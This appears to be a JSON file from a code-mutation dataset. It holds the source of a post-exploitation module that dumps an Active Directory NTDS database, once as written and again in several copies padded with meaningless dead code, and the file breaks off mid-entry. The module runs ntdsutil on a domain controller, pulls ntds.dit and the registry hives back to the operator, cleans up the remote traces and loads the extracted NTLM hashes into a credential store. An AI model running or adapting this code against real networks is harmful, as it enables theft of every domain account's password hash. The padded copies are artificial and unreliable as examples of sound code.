[
    {
        "func_name": "options",
        "original": "def options(self, context, module_options):\n    \"\"\"\n        Dump NTDS with ntdsutil\n        Module by @zblurx\n\n        DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing\n        \"\"\"\n    self.share = 'ADMIN$'\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.tmp_share = self.tmp_dir.split('C:\\\\Windows\\\\')[1]\n    self.dump_location = str(time.time())[:9]\n    self.dir_result = self.dir_result = tempfile.mkdtemp()\n    self.no_delete = False\n    if 'DIR_RESULT' in module_options:\n        self.dir_result = os.path.abspath(module_options['DIR_RESULT'])\n        self.no_delete = True",
        "mutated": [
            "def options(self, context, module_options):\n    if False:\n        i = 10\n    '\\n        Dump NTDS with ntdsutil\\n        Module by @zblurx\\n\\n        DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing\\n        '\n    self.share = 'ADMIN$'\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.tmp_share = self.tmp_dir.split('C:\\\\Windows\\\\')[1]\n    self.dump_location = str(time.time())[:9]\n    self.dir_result = self.dir_result = tempfile.mkdtemp()\n    self.no_delete = False\n    if 'DIR_RESULT' in module_options:\n        self.dir_result = os.path.abspath(module_options['DIR_RESULT'])\n        self.no_delete = True",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    '\\n        Dump NTDS with ntdsutil\\n        Module by @zblurx\\n\\n        DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing\\n        '\n    self.share = 'ADMIN$'\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.tmp_share = self.tmp_dir.split('C:\\\\Windows\\\\')[1]\n    self.dump_location = str(time.time())[:9]\n    self.dir_result = self.dir_result = tempfile.mkdtemp()\n    self.no_delete = False\n    if 'DIR_RESULT' in module_options:\n        self.dir_result = os.path.abspath(module_options['DIR_RESULT'])\n        self.no_delete = True",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    '\\n        Dump NTDS with ntdsutil\\n        Module by @zblurx\\n\\n        DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing\\n        '\n    self.share = 'ADMIN$'\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.tmp_share = self.tmp_dir.split('C:\\\\Windows\\\\')[1]\n    self.dump_location = str(time.time())[:9]\n    self.dir_result = self.dir_result = tempfile.mkdtemp()\n    self.no_delete = False\n    if 'DIR_RESULT' in module_options:\n        self.dir_result = os.path.abspath(module_options['DIR_RESULT'])\n        self.no_delete = True",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    '\\n        Dump NTDS with ntdsutil\\n        Module by @zblurx\\n\\n        DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing\\n        '\n    self.share = 'ADMIN$'\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.tmp_share = self.tmp_dir.split('C:\\\\Windows\\\\')[1]\n    self.dump_location = str(time.time())[:9]\n    self.dir_result = self.dir_result = tempfile.mkdtemp()\n    self.no_delete = False\n    if 'DIR_RESULT' in module_options:\n        self.dir_result = os.path.abspath(module_options['DIR_RESULT'])\n        self.no_delete = True",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    '\\n        Dump NTDS with ntdsutil\\n        Module by @zblurx\\n\\n        DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing\\n        '\n    self.share = 'ADMIN$'\n    self.tmp_dir = 'C:\\\\Windows\\\\Temp\\\\'\n    self.tmp_share = self.tmp_dir.split('C:\\\\Windows\\\\')[1]\n    self.dump_location = str(time.time())[:9]\n    self.dir_result = self.dir_result = tempfile.mkdtemp()\n    self.no_delete = False\n    if 'DIR_RESULT' in module_options:\n        self.dir_result = os.path.abspath(module_options['DIR_RESULT'])\n        self.no_delete = True"
        ]
    },
    {
        "func_name": "add_ntds_hash",
        "original": "def add_ntds_hash(ntds_hash, host_id):\n    add_ntds_hash.ntds_hashes += 1\n    if context.enabled:\n        if 'Enabled' in ntds_hash:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n    else:\n        ntds_hash = ntds_hash.split(' ')[0]\n        context.log.highlight(ntds_hash)\n    if ntds_hash.find('$') == -1:\n        if ntds_hash.find('\\\\') != -1:\n            (domain, hash) = ntds_hash.split('\\\\')\n        else:\n            domain = connection.domain\n            hash = ntds_hash\n        try:\n            (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n            parsed_hash = ':'.join((lmhash, nthash))\n            if validate_ntlm(parsed_hash):\n                context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                add_ntds_hash.added_to_db += 1\n                return\n            raise\n        except:\n            context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n    else:\n        context.log.debug('Dumped hash is a computer account, not adding to db')",
        "mutated": [
            "def add_ntds_hash(ntds_hash, host_id):\n    if False:\n        i = 10\n    add_ntds_hash.ntds_hashes += 1\n    if context.enabled:\n        if 'Enabled' in ntds_hash:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n    else:\n        ntds_hash = ntds_hash.split(' ')[0]\n        context.log.highlight(ntds_hash)\n    if ntds_hash.find('$') == -1:\n        if ntds_hash.find('\\\\') != -1:\n            (domain, hash) = ntds_hash.split('\\\\')\n        else:\n            domain = connection.domain\n            hash = ntds_hash\n        try:\n            (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n            parsed_hash = ':'.join((lmhash, nthash))\n            if validate_ntlm(parsed_hash):\n                context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                add_ntds_hash.added_to_db += 1\n                return\n            raise\n        except:\n            context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n    else:\n        context.log.debug('Dumped hash is a computer account, not adding to db')",
            "def add_ntds_hash(ntds_hash, host_id):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    add_ntds_hash.ntds_hashes += 1\n    if context.enabled:\n        if 'Enabled' in ntds_hash:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n    else:\n        ntds_hash = ntds_hash.split(' ')[0]\n        context.log.highlight(ntds_hash)\n    if ntds_hash.find('$') == -1:\n        if ntds_hash.find('\\\\') != -1:\n            (domain, hash) = ntds_hash.split('\\\\')\n        else:\n            domain = connection.domain\n            hash = ntds_hash\n        try:\n            (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n            parsed_hash = ':'.join((lmhash, nthash))\n            if validate_ntlm(parsed_hash):\n                context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                add_ntds_hash.added_to_db += 1\n                return\n            raise\n        except:\n            context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n    else:\n        context.log.debug('Dumped hash is a computer account, not adding to db')",
            "def add_ntds_hash(ntds_hash, host_id):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    add_ntds_hash.ntds_hashes += 1\n    if context.enabled:\n        if 'Enabled' in ntds_hash:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n    else:\n        ntds_hash = ntds_hash.split(' ')[0]\n        context.log.highlight(ntds_hash)\n    if ntds_hash.find('$') == -1:\n        if ntds_hash.find('\\\\') != -1:\n            (domain, hash) = ntds_hash.split('\\\\')\n        else:\n            domain = connection.domain\n            hash = ntds_hash\n        try:\n            (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n            parsed_hash = ':'.join((lmhash, nthash))\n            if validate_ntlm(parsed_hash):\n                context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                add_ntds_hash.added_to_db += 1\n                return\n            raise\n        except:\n            context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n    else:\n        context.log.debug('Dumped hash is a computer account, not adding to db')",
            "def add_ntds_hash(ntds_hash, host_id):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    add_ntds_hash.ntds_hashes += 1\n    if context.enabled:\n        if 'Enabled' in ntds_hash:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n    else:\n        ntds_hash = ntds_hash.split(' ')[0]\n        context.log.highlight(ntds_hash)\n    if ntds_hash.find('$') == -1:\n        if ntds_hash.find('\\\\') != -1:\n            (domain, hash) = ntds_hash.split('\\\\')\n        else:\n            domain = connection.domain\n            hash = ntds_hash\n        try:\n            (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n            parsed_hash = ':'.join((lmhash, nthash))\n            if validate_ntlm(parsed_hash):\n                context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                add_ntds_hash.added_to_db += 1\n                return\n            raise\n        except:\n            context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n    else:\n        context.log.debug('Dumped hash is a computer account, not adding to db')",
            "def add_ntds_hash(ntds_hash, host_id):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    add_ntds_hash.ntds_hashes += 1\n    if context.enabled:\n        if 'Enabled' in ntds_hash:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n    else:\n        ntds_hash = ntds_hash.split(' ')[0]\n        context.log.highlight(ntds_hash)\n    if ntds_hash.find('$') == -1:\n        if ntds_hash.find('\\\\') != -1:\n            (domain, hash) = ntds_hash.split('\\\\')\n        else:\n            domain = connection.domain\n            hash = ntds_hash\n        try:\n            (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n            parsed_hash = ':'.join((lmhash, nthash))\n            if validate_ntlm(parsed_hash):\n                context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                add_ntds_hash.added_to_db += 1\n                return\n            raise\n        except:\n            context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n    else:\n        context.log.debug('Dumped hash is a computer account, not adding to db')"
        ]
    },
    {
        "func_name": "on_admin_login",
        "original": "def on_admin_login(self, context, connection):\n    command = 'powershell \"ntdsutil.exe \\'ac i ntds\\' \\'ifm\\' \\'create full %s%s\\' q q\"' % (self.tmp_dir, self.dump_location)\n    context.log.display('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir, self.dump_location))\n    context.log.highlight('Dumping the NTDS, this could take a while so go grab a redbull...')\n    context.log.debug('Executing command {}'.format(command))\n    p = connection.execute(command, True)\n    context.log.debug(p)\n    if 'success' in p:\n        context.log.success('NTDS.dit dumped to %s%s' % (self.tmp_dir, self.dump_location))\n    else:\n        context.log.fail('Error while dumping NTDS')\n        return\n    os.makedirs(self.dir_result, exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)\n    context.log.display('Copying NTDS dump to %s' % self.dir_result)\n    context.log.debug('Copy ntds.dit to host')\n    with open(os.path.join(self.dir_result, 'Active Directory', 'ntds.dit'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'Active Directory\\\\ntds.dit', dump_file.write)\n            context.log.debug('Copied ntds.dit file')\n        except Exception as e:\n            context.log.fail('Error while get ntds.dit file: {}'.format(e))\n    context.log.debug('Copy SYSTEM to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SYSTEM'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SYSTEM', dump_file.write)\n            context.log.debug('Copied SYSTEM file')\n        except Exception as e:\n            context.log.fail('Error while get SYSTEM file: {}'.format(e))\n    context.log.debug('Copy SECURITY to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SECURITY'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SECURITY', dump_file.write)\n            context.log.debug('Copied SECURITY file')\n        except Exception as e:\n            context.log.fail('Error while get SECURITY file: {}'.format(e))\n    context.log.display('NTDS dump copied to %s' % self.dir_result)\n    try:\n        command = 'rmdir /s /q %s%s' % (self.tmp_dir, self.dump_location)\n        p = connection.execute(command, True)\n        context.log.success('Deleted %s%s remote dump directory' % (self.tmp_dir, self.dump_location))\n    except Exception as e:\n        context.log.fail('Error deleting {} remote directory on share {}: {}'.format(self.dump_location, self.share, e))\n    localOperations = LocalOperations('%s/registry/SYSTEM' % self.dir_result)\n    bootKey = localOperations.getBootKey()\n    noLMHash = localOperations.checkNoLMHashPolicy()\n    host_id = context.db.get_hosts(filter_term=connection.host)[0][0]\n\n    def add_ntds_hash(ntds_hash, host_id):\n        add_ntds_hash.ntds_hashes += 1\n        if context.enabled:\n            if 'Enabled' in ntds_hash:\n                ntds_hash = ntds_hash.split(' ')[0]\n                context.log.highlight(ntds_hash)\n        else:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n        if ntds_hash.find('$') == -1:\n            if ntds_hash.find('\\\\') != -1:\n                (domain, hash) = ntds_hash.split('\\\\')\n            else:\n                domain = connection.domain\n                hash = ntds_hash\n            try:\n                (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n                parsed_hash = ':'.join((lmhash, nthash))\n                if validate_ntlm(parsed_hash):\n                    context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                    add_ntds_hash.added_to_db += 1\n                    return\n                raise\n            except:\n                context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n        else:\n            context.log.debug('Dumped hash is a computer account, not adding to db')\n    add_ntds_hash.ntds_hashes = 0\n    add_ntds_hash.added_to_db = 0\n    NTDS = NTDSHashes('%s/Active Directory/ntds.dit' % self.dir_result, bootKey, isRemote=False, history=False, noLMHash=noLMHash, remoteOps=None, useVSSMethod=True, justNTLM=True, pwdLastSet=False, resumeSession=None, outputFileName=connection.output_filename, justUser=None, printUserStatus=True, perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, host_id))\n    try:\n        context.log.success('Dumping the NTDS, this could take a while so go grab a redbull...')\n        NTDS.dump()\n        context.log.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), connection.output_filename + '.ntds', highlight(add_ntds_hash.added_to_db)))\n        context.log.display('To extract only enabled accounts from the output file, run the following command: ')\n        context.log.display(\"grep -iv disabled {} | cut -d ':' -f1\".format(connection.output_filename + '.ntds'))\n    except Exception as e:\n        context.log.fail(e)\n    NTDS.finish()\n    if self.no_delete:\n        context.log.display('Raw NTDS dump copied to %s, parse it with:' % self.dir_result)\n        context.log.display('secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds \"%s/Active Directory/ntds.dit\" LOCAL' % (self.dir_result, self.dir_result, self.dir_result))\n    else:\n        shutil.rmtree(self.dir_result)",
        "mutated": [
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n    command = 'powershell \"ntdsutil.exe \\'ac i ntds\\' \\'ifm\\' \\'create full %s%s\\' q q\"' % (self.tmp_dir, self.dump_location)\n    context.log.display('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir, self.dump_location))\n    context.log.highlight('Dumping the NTDS, this could take a while so go grab a redbull...')\n    context.log.debug('Executing command {}'.format(command))\n    p = connection.execute(command, True)\n    context.log.debug(p)\n    if 'success' in p:\n        context.log.success('NTDS.dit dumped to %s%s' % (self.tmp_dir, self.dump_location))\n    else:\n        context.log.fail('Error while dumping NTDS')\n        return\n    os.makedirs(self.dir_result, exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)\n    context.log.display('Copying NTDS dump to %s' % self.dir_result)\n    context.log.debug('Copy ntds.dit to host')\n    with open(os.path.join(self.dir_result, 'Active Directory', 'ntds.dit'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'Active Directory\\\\ntds.dit', dump_file.write)\n            context.log.debug('Copied ntds.dit file')\n        except Exception as e:\n            context.log.fail('Error while get ntds.dit file: {}'.format(e))\n    context.log.debug('Copy SYSTEM to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SYSTEM'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SYSTEM', dump_file.write)\n            context.log.debug('Copied SYSTEM file')\n        except Exception as e:\n            context.log.fail('Error while get SYSTEM file: {}'.format(e))\n    context.log.debug('Copy SECURITY to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SECURITY'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SECURITY', dump_file.write)\n            context.log.debug('Copied SECURITY file')\n        except Exception as e:\n            context.log.fail('Error while get SECURITY file: {}'.format(e))\n    context.log.display('NTDS dump copied to %s' % self.dir_result)\n    try:\n        command = 'rmdir /s /q %s%s' % (self.tmp_dir, self.dump_location)\n        p = connection.execute(command, True)\n        context.log.success('Deleted %s%s remote dump directory' % (self.tmp_dir, self.dump_location))\n    except Exception as e:\n        context.log.fail('Error deleting {} remote directory on share {}: {}'.format(self.dump_location, self.share, e))\n    localOperations = LocalOperations('%s/registry/SYSTEM' % self.dir_result)\n    bootKey = localOperations.getBootKey()\n    noLMHash = localOperations.checkNoLMHashPolicy()\n    host_id = context.db.get_hosts(filter_term=connection.host)[0][0]\n\n    def add_ntds_hash(ntds_hash, host_id):\n        add_ntds_hash.ntds_hashes += 1\n        if context.enabled:\n            if 'Enabled' in ntds_hash:\n                ntds_hash = ntds_hash.split(' ')[0]\n                context.log.highlight(ntds_hash)\n        else:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n        if ntds_hash.find('$') == -1:\n            if ntds_hash.find('\\\\') != -1:\n                (domain, hash) = ntds_hash.split('\\\\')\n            else:\n                domain = connection.domain\n                hash = ntds_hash\n            try:\n                (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n                parsed_hash = ':'.join((lmhash, nthash))\n                if validate_ntlm(parsed_hash):\n                    context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                    add_ntds_hash.added_to_db += 1\n                    return\n                raise\n            except:\n                context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n        else:\n            context.log.debug('Dumped hash is a computer account, not adding to db')\n    add_ntds_hash.ntds_hashes = 0\n    add_ntds_hash.added_to_db = 0\n    NTDS = NTDSHashes('%s/Active Directory/ntds.dit' % self.dir_result, bootKey, isRemote=False, history=False, noLMHash=noLMHash, remoteOps=None, useVSSMethod=True, justNTLM=True, pwdLastSet=False, resumeSession=None, outputFileName=connection.output_filename, justUser=None, printUserStatus=True, perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, host_id))\n    try:\n        context.log.success('Dumping the NTDS, this could take a while so go grab a redbull...')\n        NTDS.dump()\n        context.log.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), connection.output_filename + '.ntds', highlight(add_ntds_hash.added_to_db)))\n        context.log.display('To extract only enabled accounts from the output file, run the following command: ')\n        context.log.display(\"grep -iv disabled {} | cut -d ':' -f1\".format(connection.output_filename + '.ntds'))\n    except Exception as e:\n        context.log.fail(e)\n    NTDS.finish()\n    if self.no_delete:\n        context.log.display('Raw NTDS dump copied to %s, parse it with:' % self.dir_result)\n        context.log.display('secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds \"%s/Active Directory/ntds.dit\" LOCAL' % (self.dir_result, self.dir_result, self.dir_result))\n    else:\n        shutil.rmtree(self.dir_result)",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    command = 'powershell \"ntdsutil.exe \\'ac i ntds\\' \\'ifm\\' \\'create full %s%s\\' q q\"' % (self.tmp_dir, self.dump_location)\n    context.log.display('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir, self.dump_location))\n    context.log.highlight('Dumping the NTDS, this could take a while so go grab a redbull...')\n    context.log.debug('Executing command {}'.format(command))\n    p = connection.execute(command, True)\n    context.log.debug(p)\n    if 'success' in p:\n        context.log.success('NTDS.dit dumped to %s%s' % (self.tmp_dir, self.dump_location))\n    else:\n        context.log.fail('Error while dumping NTDS')\n        return\n    os.makedirs(self.dir_result, exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)\n    context.log.display('Copying NTDS dump to %s' % self.dir_result)\n    context.log.debug('Copy ntds.dit to host')\n    with open(os.path.join(self.dir_result, 'Active Directory', 'ntds.dit'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'Active Directory\\\\ntds.dit', dump_file.write)\n            context.log.debug('Copied ntds.dit file')\n        except Exception as e:\n            context.log.fail('Error while get ntds.dit file: {}'.format(e))\n    context.log.debug('Copy SYSTEM to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SYSTEM'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SYSTEM', dump_file.write)\n            context.log.debug('Copied SYSTEM file')\n        except Exception as e:\n            context.log.fail('Error while get SYSTEM file: {}'.format(e))\n    context.log.debug('Copy SECURITY to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SECURITY'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SECURITY', dump_file.write)\n            context.log.debug('Copied SECURITY file')\n        except Exception as e:\n            context.log.fail('Error while get SECURITY file: {}'.format(e))\n    context.log.display('NTDS dump copied to %s' % self.dir_result)\n    try:\n        command = 'rmdir /s /q %s%s' % (self.tmp_dir, self.dump_location)\n        p = connection.execute(command, True)\n        context.log.success('Deleted %s%s remote dump directory' % (self.tmp_dir, self.dump_location))\n    except Exception as e:\n        context.log.fail('Error deleting {} remote directory on share {}: {}'.format(self.dump_location, self.share, e))\n    localOperations = LocalOperations('%s/registry/SYSTEM' % self.dir_result)\n    bootKey = localOperations.getBootKey()\n    noLMHash = localOperations.checkNoLMHashPolicy()\n    host_id = context.db.get_hosts(filter_term=connection.host)[0][0]\n\n    def add_ntds_hash(ntds_hash, host_id):\n        add_ntds_hash.ntds_hashes += 1\n        if context.enabled:\n            if 'Enabled' in ntds_hash:\n                ntds_hash = ntds_hash.split(' ')[0]\n                context.log.highlight(ntds_hash)\n        else:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n        if ntds_hash.find('$') == -1:\n            if ntds_hash.find('\\\\') != -1:\n                (domain, hash) = ntds_hash.split('\\\\')\n            else:\n                domain = connection.domain\n                hash = ntds_hash\n            try:\n                (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n                parsed_hash = ':'.join((lmhash, nthash))\n                if validate_ntlm(parsed_hash):\n                    context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                    add_ntds_hash.added_to_db += 1\n                    return\n                raise\n            except:\n                context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n        else:\n            context.log.debug('Dumped hash is a computer account, not adding to db')\n    add_ntds_hash.ntds_hashes = 0\n    add_ntds_hash.added_to_db = 0\n    NTDS = NTDSHashes('%s/Active Directory/ntds.dit' % self.dir_result, bootKey, isRemote=False, history=False, noLMHash=noLMHash, remoteOps=None, useVSSMethod=True, justNTLM=True, pwdLastSet=False, resumeSession=None, outputFileName=connection.output_filename, justUser=None, printUserStatus=True, perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, host_id))\n    try:\n        context.log.success('Dumping the NTDS, this could take a while so go grab a redbull...')\n        NTDS.dump()\n        context.log.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), connection.output_filename + '.ntds', highlight(add_ntds_hash.added_to_db)))\n        context.log.display('To extract only enabled accounts from the output file, run the following command: ')\n        context.log.display(\"grep -iv disabled {} | cut -d ':' -f1\".format(connection.output_filename + '.ntds'))\n    except Exception as e:\n        context.log.fail(e)\n    NTDS.finish()\n    if self.no_delete:\n        context.log.display('Raw NTDS dump copied to %s, parse it with:' % self.dir_result)\n        context.log.display('secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds \"%s/Active Directory/ntds.dit\" LOCAL' % (self.dir_result, self.dir_result, self.dir_result))\n    else:\n        shutil.rmtree(self.dir_result)",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    command = 'powershell \"ntdsutil.exe \\'ac i ntds\\' \\'ifm\\' \\'create full %s%s\\' q q\"' % (self.tmp_dir, self.dump_location)\n    context.log.display('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir, self.dump_location))\n    context.log.highlight('Dumping the NTDS, this could take a while so go grab a redbull...')\n    context.log.debug('Executing command {}'.format(command))\n    p = connection.execute(command, True)\n    context.log.debug(p)\n    if 'success' in p:\n        context.log.success('NTDS.dit dumped to %s%s' % (self.tmp_dir, self.dump_location))\n    else:\n        context.log.fail('Error while dumping NTDS')\n        return\n    os.makedirs(self.dir_result, exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)\n    context.log.display('Copying NTDS dump to %s' % self.dir_result)\n    context.log.debug('Copy ntds.dit to host')\n    with open(os.path.join(self.dir_result, 'Active Directory', 'ntds.dit'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'Active Directory\\\\ntds.dit', dump_file.write)\n            context.log.debug('Copied ntds.dit file')\n        except Exception as e:\n            context.log.fail('Error while get ntds.dit file: {}'.format(e))\n    context.log.debug('Copy SYSTEM to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SYSTEM'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SYSTEM', dump_file.write)\n            context.log.debug('Copied SYSTEM file')\n        except Exception as e:\n            context.log.fail('Error while get SYSTEM file: {}'.format(e))\n    context.log.debug('Copy SECURITY to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SECURITY'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SECURITY', dump_file.write)\n            context.log.debug('Copied SECURITY file')\n        except Exception as e:\n            context.log.fail('Error while get SECURITY file: {}'.format(e))\n    context.log.display('NTDS dump copied to %s' % self.dir_result)\n    try:\n        command = 'rmdir /s /q %s%s' % (self.tmp_dir, self.dump_location)\n        p = connection.execute(command, True)\n        context.log.success('Deleted %s%s remote dump directory' % (self.tmp_dir, self.dump_location))\n    except Exception as e:\n        context.log.fail('Error deleting {} remote directory on share {}: {}'.format(self.dump_location, self.share, e))\n    localOperations = LocalOperations('%s/registry/SYSTEM' % self.dir_result)\n    bootKey = localOperations.getBootKey()\n    noLMHash = localOperations.checkNoLMHashPolicy()\n    host_id = context.db.get_hosts(filter_term=connection.host)[0][0]\n\n    def add_ntds_hash(ntds_hash, host_id):\n        add_ntds_hash.ntds_hashes += 1\n        if context.enabled:\n            if 'Enabled' in ntds_hash:\n                ntds_hash = ntds_hash.split(' ')[0]\n                context.log.highlight(ntds_hash)\n        else:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n        if ntds_hash.find('$') == -1:\n            if ntds_hash.find('\\\\') != -1:\n                (domain, 